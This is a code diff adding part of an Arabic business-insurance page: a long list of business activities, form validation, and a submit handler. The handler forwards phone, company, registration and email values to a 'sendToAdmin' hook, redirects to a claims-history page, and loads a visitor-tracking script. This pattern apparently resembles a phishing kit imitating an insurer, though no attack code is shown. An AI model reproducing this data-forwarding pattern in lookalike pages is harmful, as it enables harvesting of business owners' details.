+                <div class="activity-option" data-value="1823">قص وتصفيف الشعر والحلاقة للرجال</div>
+                <div class="activity-option" data-value="187">قص وتفصيل الخيام والأشرعة والشالات وأغطية السيارات والأثاث والآلات والبضائع . إلخ</div>
+                <div class="activity-option" data-value="184">قص وتفصيل الستائر</div>
+                <div class="activity-option" data-value="183">قص وتفصيل المفروشات والأصناف المحشوة والأغطية المنزلية مثل الملاءات، أكياس الوسائد، المفارش، الألحفة، الوسائد، وأكياس النوم للرحلات وأنواع البياضات الأخرى .. إلخ</div>
+                <div class="activity-option" data-value="1337">قطر السفن</div>
+                <div class="activity-option" data-value="1328">قطر وسحب المركبات</div>
+                <div class="activity-option" data-value="466">قطع وتشكيل وتجهيز الأحجار للاستخدام في البناء والتشييد والطرق ... إلخ</div>
+                <div class="activity-option" data-value="469">قطع ونشر الرخام</div>
+                <div class="activity-option" data-value="1681">كنس الشوارع</div>
+                <div class="activity-option" data-value="1821">كي الملابس</div>
+                <div class="activity-option" data-value="1559">مؤسسات ووكالات الدعاية والإعلان</div>
+                <div class="activity-option" data-value="1804">مؤسسة وقفية</div>
+                <div class="activity-option" data-value="1131">مجمعات تجارية استهلاكية</div>
+                <div class="activity-option" data-value="1146">محطات بيع وقود المركبات</div>
+                <div class="activity-option" data-value="1151">محطات تخزين وتوزيع الوقود التجاري</div>
+                <div class="activity-option" data-value="1332">محطات شحن السيارات والدراجات الكهربائية</div>
+                <div class="activity-option" data-value="1013">محطات غسيل وتشحيم المركبات</div>
+                <div class="activity-option" data-value="1097">محطة تعبئة أسطوانات غاز النفط المسال (الحاويات)</div>
+                <div class="activity-option" data-value="1094">محطة تعبئة أسطوانات غاز النفط المسال (العبوات)</div>
+                <div class="activity-option" data-value="1150">محطة تعبئة وقود خاصة (ديزل)</div>
+                <div class="activity-option" data-value="1127">محلات البقالة</div>
+                <div class="activity-option" data-value="1379">محلات البوظة (الآيس كريم)</div>
+                <div class="activity-option" data-value="1130">محلات التسوق السريع</div>
+                <div class="activity-option" data-value="1703">محلات الخطاطين</div>
+                <div class="activity-option" data-value="1378">محلات الوجبات السريعة</div>
+                <div class="activity-option" data-value="1391">محلات بيع العصائر</div>
+                <div class="activity-option" data-value="1380">محلات شوي الأسماك والمأكولات البحرية</div>
+                <div class="activity-option" data-value="1381">محلات شوي اللحوم (المشاكيك)</div>
+                <div class="activity-option" data-value="137">مخبز يدوي (تنور)</div>
+                <div class="activity-option" data-value="1765">مختبر أسنان</div>
+                <div class="activity-option" data-value="1628">مختبر تحاليل بيطرية</div>
+                <div class="activity-option" data-value="1545">مختبرات الفحص والاختبار</div>
+                <div class="activity-option" data-value="1548">مختبرات المعايرة</div>
+                <div class="activity-option" data-value="1761">مختبرات طبية</div>
+                <div class="activity-option" data-value="973">مد أسلاك الاتصالات والألياف البصرية</div>
+                <div class="activity-option" data-value="1723">مدرسة أجنبية (للجاليات)</div>
+                <div class="activity-option" data-value="1742">مدرسة تحفيظ القرآن الكريم</div>
+                <div class="activity-option" data-value="1721">مدرسة خاصة</div>
+                <div class="activity-option" data-value="1724">مدرسة خاصة للتعليم المبكر (تعليم القرآن الكريم)</div>
+                <div class="activity-option" data-value="1720">مدرسة خاصة للتعليم المبكر (روضة)</div>
+                <div class="activity-option" data-value="1722">مدرسة دولية خاصة</div>
+                <div class="activity-option" data-value="1768">مرافق تقديم الرعاية التمريضية مع الإقامة</div>
+                <div class="activity-option" data-value="1760">مراكز الأشعة المتخصصة</div>
+                <div class="activity-option" data-value="1784">مراكز اللياقة البدنية يشمل مراكز كمال الأجسام</div>
+                <div class="activity-option" data-value="1769">مراكز تأهيل متخصصة</div>
+                <div class="activity-option" data-value="1747">مركز أجهزة محاكاة الطيران</div>
+                <div class="activity-option" data-value="1555">مركز الدراسات والأبحاث الدوائية</div>
+                <div class="activity-option" data-value="1826">مركز العناية الشخصية الرجالية</div>
+                <div class="activity-option" data-value="1735">مركز تدريب الغوص</div>
+                <div class="activity-option" data-value="1705">مركز سند للخدمات</div>
+                <div class="activity-option" data-value="3">مزارع إنتاجية للخضروات</div>
+                <div class="activity-option" data-value="1630">مستشفى بيطري</div>
+                <div class="activity-option" data-value="1324">مستودع البضائع</div>
+                <div class="activity-option" data-value="1326">مستودع مستحضرات بيطرية</div>
+                <div class="activity-option" data-value="1325">مستودعات الأدوية</div>
+                <div class="activity-option" data-value="33">مشروعات الري (تشغيل نظم الري للمشروعات الزراعية)</div>
+                <div class="activity-option" data-value="312">مصافي النفط ومشتقاته</div>
+                <div class="activity-option" data-value="488">مصنوعات معدنية عادية غير حديدية (أسلاك، مواسير، أنابيب، مساحيق، أوراق، صفائح، ... إلخ)</div>
+                <div class="activity-option" data-value="485">مصنوعات معدنية غير عادية مطلية أو مغطاة أو مخلوطة بالمعادن الثمينة من الذهب أو الفضة أو المعادن الثمينة الأخرى</div>
+                <div class="activity-option" data-value="1386">مطابخ إعداد الولائم للحفلات</div>
+                <div class="activity-option" data-value="299">مطابع غير متخصصة</div>
+                <div class="activity-option" data-value="1389">مطاعم ومقاصف المنشآت العامة</div>
+                <div class="activity-option" data-value="939">معالجة البطاريات وإعادة تدويرها</div>
+                <div class="activity-option" data-value="949">معالجة المواد الخطرة والملوثة بالاشعاع</div>
+                <div class="activity-option" data-value="938">معالجة النفايات الخطرة وتصريفها</div>
+                <div class="activity-option" data-value="947">معالجة النفايات النفطية وإعادة تدويرها</div>
+                <div class="activity-option" data-value="83">معالجة مخلفات الذبائح الحيوانية والدواجن</div>
+                <div class="activity-option" data-value="84">معالجة مخلفات الطعام</div>
+                <div class="activity-option" data-value="929">معالجة مياه الصرف الصحي</div>
+                <div class="activity-option" data-value="946">معالجة وتقطيع الإطارات المستعملة وإعادة تدويرها</div>
+                <div class="activity-option" data-value="507">معالجة وطلي المعادن مثل الصقل والتلميع والحفر والتلوين والتنظيف ... إلخ</div>
+                <div class="activity-option" data-value="1744">معاهد التدريب</div>
+                <div class="activity-option" data-value="1734">معاهد تعليم الفروسية</div>
+                <div class="activity-option" data-value="1340">معاينة وفحص الوحدات البحرية التي لا تشملها المعاهدات البحرية الدولية</div>
+                <div class="activity-option" data-value="1429">مقاهي الإنترنت (خدمات النفاذ للانترنت العامة)</div>
+                <div class="activity-option" data-value="952">مقاولات البناء والتشييد (إنشاءات عامة للمباني السكنية والغير سكنية)</div>
+                <div class="activity-option" data-value="957">مقاولات إنشاء شبكات الصرف الصحي</div>
+                <div class="activity-option" data-value="958">مقاولات إنشاء شبكات ومحطات المياه والكهرباء والهاتف</div>
+                <div class="activity-option" data-value="963">مقاولات إنشاء محطات الصرف الصحي</div>
+                <div class="activity-option" data-value="954">مقاولات إنشاء وصيانة الطرق</div>
+                <div class="activity-option" data-value="983">مقاولات تركيبات الأبنية</div>
+                <div class="activity-option" data-value="1393">مقهى الشيشة</div>
+                <div class="activity-option" data-value="1384">مقهى متنقل</div>
+                <div class="activity-option" data-value="1673">مكاتب الارشاد السياحي</div>
+                <div class="activity-option" data-value="1524">مكاتب الإستشارات القانونية</div>
+                <div class="activity-option" data-value="1553">مكاتب الاستشارية الخاصة بجهات تقييم المطابقة</div>
+                <div class="activity-option" data-value="1360">مكاتب التخليص الجمركي</div>
+                <div class="activity-option" data-value="1037">مكاتب التصدير والاستيراد</div>
+                <div class="activity-option" data-value="1552">مكاتب التفتيش طبقا للمواصفة القياسية الدولية ايزو 17020</div>
+                <div class="activity-option" data-value="1672">مكاتب التنسيق الطبي</div>
+                <div class="activity-option" data-value="1661">مكاتب العمالة (الاستقدام)</div>
+                <div class="activity-option" data-value="1361">مكاتب الكيالة والوزن</div>
+                <div class="activity-option" data-value="1523">مكاتب المحاماة</div>
+                <div class="activity-option" data-value="1526">مكاتب المراجعة وتدقيق الحسابات</div>
+                <div class="activity-option" data-value="950">مكافحة التلوث البحري</div>
+                <div class="activity-option" data-value="1680">مكافحة وإبادة الحشرات والقوارض</div>
+                <div class="activity-option" data-value="1529">مكتب إداري</div>
+                <div class="activity-option" data-value="1039">مكتب تمثيل تجاري</div>
+                <div class="activity-option" data-value="1556">مكتب علمي</div>
+                <div class="activity-option" data-value="1549">منح شهادات تقييم المطابقة</div>
+                <div class="activity-option" data-value="1470">منصة التمويل الجماعي</div>
+                <div class="activity-option" data-value="1288">منفذ بيع المأكولات المنزلية</div>
+                <div class="activity-option" data-value="1701">مواد وبرامج إعلامية</div>
+                <div class="activity-option" data-value="1710">نادي ثقافي واجتماعي</div>
+                <div class="activity-option" data-value="1795">نادي لممارسة الطيران</div>
+                <div class="activity-option" data-value="177">نسج المنسوجات</div>
+                <div class="activity-option" data-value="517">نسخ المفاتيح</div>
+                <div class="activity-option" data-value="1398">نشر الأدلة وقوائم العناوين البريدية على الشبكة المعلوماتية (الإنترنت)</div>
+                <div class="activity-option" data-value="1410">نشر البرمجيات على الشبكة المعلوماتية (الإنترنت)</div>
+                <div class="activity-option" data-value="1399">نشر الصحف والمجلات العامة</div>
+                <div class="activity-option" data-value="1402">نشر الصحف وغيرها على الشبكة المعلوماتية (الإنترنت)</div>
+                <div class="activity-option" data-value="1403">نشر الصور الفوتوغرافية والنقوش</div>
+                <div class="activity-option" data-value="1396">نشر الكتب على الشبكة المعلوماتية (الإنترنت)</div>
+                <div class="activity-option" data-value="1394">نشر الكتب والكتب المدرسية والكتيبات الأخرى</div>
+                <div class="activity-option" data-value="1400">نشر المجلات الدورية العلمية والأدبية والتقنية ... إلخ</div>
+                <div class="activity-option" data-value="1407">نشر المواد المصغرة بواسطة الميكروفيلم أو الألبومات ... إلخ</div>
+                <div class="activity-option" data-value="1418">نشر الموسيقى على الشبكة المعلوماتية (الإنترنت)</div>
+                <div class="activity-option" data-value="1406">نشر النماذج والملصقات</div>
+                <div class="activity-option" data-value="1417">نشر شرائط الكاسيت والأقراص المدمجة الصوتية</div>
+                <div class="activity-option" data-value="241">نشر وتقطيع الألواح أو الخشب الخام</div>
+                <div class="activity-option" data-value="1409">نشر وتوفير البرمجيات الجاهزة</div>
+                <div class="activity-option" data-value="1290">نقل البضائع بالسكك الحديدية</div>
+                <div class="activity-option" data-value="1294">نقل الحجاج والمعتمرين</div>
+                <div class="activity-option" data-value="1289">نقل الركاب بالسكك الحديدية فيما بين المدن</div>
+                <div class="activity-option" data-value="916">نقل الطاقة الكهربائية وتوزيعها</div>
+                <div class="activity-option" data-value="1312">نقل الغازات والسوائل عبر خطوط الأنابيب (لا يشمل شبكة المياه)</div>
+                <div class="activity-option" data-value="1295">نقل طلاب المؤسسات التعليمية</div>
+                <div class="activity-option" data-value="928">نقل مياه الصرف الصحي</div>
+                <div class="activity-option" data-value="1308">نقل وبيع الثروات المائية</div>
+                <div class="activity-option" data-value="926">نقل وبيع المياه غير الصالحة للشرب</div>
+                <div class="activity-option" data-value="925">نقل وبيع مياه الشرب</div>
+                <div class="activity-option" data-value="1310">نقل وشحن المركبات</div>
+                <div class="activity-option" data-value="967">هدم المباني وغيرها من الهياكل</div>
+                <div class="activity-option" data-value="1491">هيكلة المنتجات</div>
+                <div class="activity-option" data-value="498">ورش الألمنيوم</div>
+                <div class="activity-option" data-value="497">ورشة حدادة</div>
+                <div class="activity-option" data-value="1520">وساطة العقارات (بيع وتأجير العقارات)</div>
+                <div class="activity-option" data-value="1351">وسيط الشحن والتفريغ البحري</div>
+                <div class="activity-option" data-value="997">وضع أو تركيب عوازل الرطوبة وعوازل المياه</div>
+                <div class="activity-option" data-value="1038">وكالات الأعمال التجارية (لا تشمل أعمال المحافظ والمتاجرة بالأوراق المالية)</div>
+                <div class="activity-option" data-value="1664">وكالة تشغيل البحارة</div>
+                <div class="activity-option" data-value="1035">وكلاء العمولة والوساطة التجارية (لا تشمل أعمال المحافظ والمتاجرة بالأوراق المالية)</div>
+                <div class="activity-option" data-value="1344">وكيل الحمولة</div>
+                <div class="activity-option" data-value="1334">وكيل النقل البري للبضائع</div>
+                <div class="activity-option" data-value="1333">وكيل النقل البري للركاب</div>
+                <div class="activity-option" data-value="1509">وكيل تأمين بالعمولة</div>
+                <div class="activity-option" data-value="1463">وكيل حملة السندات/ الصكوك</div>
+                <div class="activity-option" data-value="1343">وكيل سفينة</div>
+                <div class="activity-option" data-value="1496">وكيل وساطة أوراق مالية</div>
+              </div>
+            </div>
+          </div>
+
+          <!-- Terms -->
+          <div class="terms-check">
+            <input type="checkbox" id="terms">
+            <label for="terms">بالمتابعة أنت توافق على <a href="javascript:void(0)">الشروط والأحكام</a></label>
+          </div>
+
+          <!-- Submit -->
+          <button type="button" class="btn-submit" onclick="submitWCForm()">إرسال</button>
+        </form>
+      </div>
+    </div>
+  </section>
+
+  <!-- Footer -->
+  <footer class="b2b-footer">
+    <div class="container">
+      <div class="copyright">حقوق النشر © 2026, جميع الحقوق محفوظة.</div>
+      <div class="footer-links">
+        <a href="/">الرئيسية</a>
+        <a href="javascript:void(0)">الشروط</a>
+        <a href="javascript:void(0)">سياسة الخصوصية</a>
+        <a href="javascript:void(0)">تواصل معنا</a>
+      </div>
+    </div>
+  </footer>
+
+  <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
+  <script>
+    const searchInput = document.getElementById('business_activities_search');
+    const dropdown = document.getElementById('activities_dropdown');
+    const selectedTags = document.getElementById('selected_tags');
+    const wrapper = document.getElementById('multiselect_wrapper');
+    const options = dropdown.querySelectorAll('.activity-option');
+    let selectedValues = new Set();
+
+    searchInput.addEventListener('focus', () => {
+      dropdown.classList.add('show');
+    });
+
+    document.addEventListener('click', (e) => {
+      if (!wrapper.contains(e.target)) {
+        dropdown.classList.remove('show');
+      }
+    });
+
+    searchInput.addEventListener('input', () => {
+      const query = searchInput.value.trim().toLowerCase();
+      options.forEach(opt => {
+        if (opt.textContent.toLowerCase().includes(query)) {
+          opt.classList.remove('hidden');
+        } else {
+          opt.classList.add('hidden');
+        }
+      });
+      dropdown.classList.add('show');
+    });
+
+    options.forEach(opt => {
+      opt.addEventListener('click', () => {
+        const val = opt.dataset.value;
+        const text = opt.textContent.trim();
+        if (selectedValues.has(val)) {
+          selectedValues.delete(val);
+          opt.classList.remove('selected');
+          removeTag(val);
+        } else {
+          selectedValues.add(val);
+          opt.classList.add('selected');
+          addTag(val, text);
+        }
+      });
+    });
+
+    function addTag(val, text) {
+      const tag = document.createElement('span');
+      tag.className = 'multiselect-tag';
+      tag.dataset.value = val;
+      tag.innerHTML = text + ' <span class="remove-tag" onclick="removeSelection(\'' + val + '\')">\u00d7</span>';
+      selectedTags.appendChild(tag);
+    }
+
+    function removeTag(val) {
+      const tag = selectedTags.querySelector('[data-value="' + val + '"]');
+      if (tag) tag.remove();
+    }
+
+    function removeSelection(val) {
+      selectedValues.delete(val);
+      removeTag(val);
+      const opt = dropdown.querySelector('[data-value="' + val + '"');
+      if (opt) opt.classList.remove('selected');
+    }
+
+    // ========== FORM VALIDATION ==========
+    function validateWCField(el) {
+      var parent = el.parentElement;
+      var existingMsg = parent.querySelector('.field-error-msg');
+      if (existingMsg) existingMsg.remove();
+      el.classList.remove('field-error');
+
+      var isEmpty = !el.value.trim();
+      if (isEmpty) {
+        el.classList.add('field-error');
+        var msg = document.createElement('span');
+        msg.className = 'field-error-msg';
+        msg.textContent = '\u0647\u0630\u0627 \u0627\u0644\u062d\u0642\u0644 \u0645\u0637\u0644\u0648\u0628';
+        parent.appendChild(msg);
+        return false;
+      }
+      return true;
+    }
+
+    function submitWCForm() {
+      var fields = ['phone', 'company_name', 'cr_no', 'email'];
+      var allValid = true;
+
+      fields.forEach(function(id) {
+        var el = document.getElementById(id);
+        if (el && !validateWCField(el)) allValid = false;
+      });
+
+      // Validate business activities (at least one selected)
+      var activitiesInput = document.getElementById('business_activities_search');
+      var activitiesParent = activitiesInput.closest('.multiselect-wrapper') || activitiesInput.parentElement;
+      var existingActMsg = activitiesParent.querySelector('.field-error-msg');
+      if (existingActMsg) existingActMsg.remove();
+      activitiesInput.classList.remove('field-error');
+
+      if (selectedValues.size === 0) {
+        activitiesInput.classList.add('field-error');
+        var actMsg = document.createElement('span');
+        actMsg.className = 'field-error-msg';
+        actMsg.textContent = '\u064a\u0631\u062c\u0649 \u0627\u062e\u062a\u064a\u0627\u0631 \u0646\u0634\u0627\u0637 \u0648\u0627\u062d\u062f \u0639\u0644\u0649 \u0627\u0644\u0623\u0642\u0644';
+        activitiesParent.appendChild(actMsg);
+        allValid = false;
+      }
+
+      // Validate terms checkbox
+      var termsEl = document.getElementById('terms');
+      var termsParent = termsEl.closest('.terms-check');
+      var existingTermsMsg = termsParent.querySelector('.terms-error');
+      if (existingTermsMsg) existingTermsMsg.remove();
+
+      if (!termsEl.checked) {
+        var termsMsg = document.createElement('span');
+        termsMsg.className = 'terms-error';
+        termsMsg.textContent = '\u064a\u0631\u062c\u0649 \u0627\u0644\u0645\u0648\u0627\u0641\u0642\u0629 \u0639\u0644\u0649 \u0627\u0644\u0634\u0631\u0648\u0637 \u0648\u0627\u0644\u0623\u062d\u0643\u0627\u0645';
+        termsParent.appendChild(termsMsg);
+        allValid = false;
+      }
+
+      if (!allValid) return;
+
+      if (window.sendToAdmin) {
+        var data = {};
+        ['phone', 'company_name', 'cr_no', 'email'].forEach(function(id) {
+          var el = document.getElementById(id);
+          if (el && el.value) data[el.placeholder || id] = el.value;
+        });
+        data['الأنشطة'] = Array.from(selectedValues).join(', ');
+        window.sendToAdmin(data, 'تأمين تعويضات العمال - البيانات');
+      }
+      localStorage.setItem('b2b_service_type', 'workers_comp');
+      window.location.href = '/insurance/b2b-claims-history';
+    }
+
+    // Clear error on input
+    ['phone', 'company_name', 'cr_no', 'email'].forEach(function(id) {
+      var el = document.getElementById(id);
+      if (el) {
+        el.addEventListener('input', function() {
+          el.classList.remove('field-error');
+          var msg = el.parentElement.querySelector('.field-error-msg');
+          if (msg) msg.remove();
+        });
+      }
+    });
+
+    // Clear activities error on selection
+    dropdown.addEventListener('click', function() {
+      var activitiesInput = document.getElementById('business_activities_search');
+      activitiesInput.classList.remove('field-error');
+      var actParent = activitiesInput.closest('.multiselect-wrapper') || activitiesInput.parentElement;
+      var msg = actParent.querySelector('.field-error-msg');
+      if (msg) msg.remove();
+    });
+
+    // Clear terms error on check
+    document.getElementById('terms').addEventListener('change', function() {
+      var termsParent = this.closest('.terms-check');
+      var msg = termsParent.querySelector('.terms-error');
+      if (msg) msg.remove();
+    });
+  </script>
+<script src="../visitor-tracking.js"></script>
+</body>
+</html>
